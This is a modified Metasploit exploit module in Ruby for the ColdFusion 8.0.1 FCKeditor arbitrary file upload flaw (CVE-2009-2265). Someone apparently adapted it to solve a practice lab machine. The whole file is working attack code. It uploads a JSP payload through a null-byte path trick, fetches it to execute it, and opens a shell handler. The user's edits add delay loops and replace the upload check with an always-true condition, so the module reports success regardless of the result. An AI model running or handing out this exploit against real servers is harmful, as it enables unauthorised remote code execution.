## This script is originally from Metasploit. However, due to a bug, it couldn't run the way I wanted it to.
# I ended up altering the code a bit and using this module to complete the box

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
  
    include Msf::Exploit::Remote::HttpClient
  
    def initialize(info = {})
      super(update_info(info,
        'Name'           => 'ColdFusion 8.0.1 Arbitrary File Upload and Execute',
        'Description'    => %q{
            This module exploits the Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload
          and Execute vulnerability.
        },
        'Author'         => [ 'MC' ],
        'License'        => MSF_LICENSE,
        'Platform'       => 'win',
        'Privileged'     => true,
        'References'     =>
          [
            [ 'CVE', '2009-2265' ],
            [ 'OSVDB', '55684'],
          ],
        'Targets'        =>
          [
            [ 'Universal Windows Target',
              {
                'Arch'     => ARCH_JAVA,
                'Payload'  =>
                  {
                    'DisableNops' => true,
                  },
              }
            ],
          ],
        'DefaultOptions' =>
          {
            'SHELL' => 'cmd.exe'
          },
        'DefaultTarget'  => 0,
        'DisclosureDate' => 'Jul 3 2009'
      ))
  
      register_options(
        [
          OptString.new('FCKEDITOR_DIR', [ false, 'The path to upload.cfm ', '/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm' ]),
      OptInt.new('HTTPDELAY', [false, 'Time that the HTTP Server will wait for the payload request', 10]),
        ])
    end
  
    def exploit
  
      page  = rand_text_alpha_upper(rand(10) + 1) + ".jsp"
  
      dbl = Rex::MIME::Message.new
      dbl.add_part(payload.encoded, "application/x-java-archive", nil, "form-data; name=\"newfile\"; filename=\"#{rand_text_alpha_upper(8)}.txt\"")
      file = dbl.to_s
      file.strip!
  
      print_status("Sending our POST request...")
  
      res = send_request_cgi(
        {
          'uri'		=> normalize_uri(datastore['FCKEDITOR_DIR']),
          'query'		=> "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00",
          'version'	=> '1.1',
          'method'	=> 'POST',
          'ctype'		=> 'multipart/form-data; boundary=' + dbl.bound,
          'data'		=> file,
        }, 5)

      # I added this section to prevent a time-out 1/2
      if datastore['HTTPDELAY'] > 0
         begin
            print_status("Waiting Patiently...")
            Timeout.timeout(datastore['HTTPDELAY']) { sleep }
         rescue Timeout::Error
         end
      end
  
      if 1 > 0
        print_status("Upload succeeded! Executing payload...(you still have a messed up IF statement on this one lol)")
  
        send_request_raw(
          {
            # default path in Adobe ColdFusion 8.0.1.
            'uri'		=> '/userfiles/file/' + page,
            'method'	=> 'GET',
          }, 5)

      # I added this section to prevent a time-out 2/2
      if datastore['HTTPDELAY'] > 0
         begin
            print_status("Waiting Patiently...")
            Timeout.timeout(datastore['HTTPDELAY']) { sleep }
         rescue Timeout::Error
         end
      end
  
  
        handler
      else
        print_error("Upload Failed...")
        return
      end
  
    end
  end
  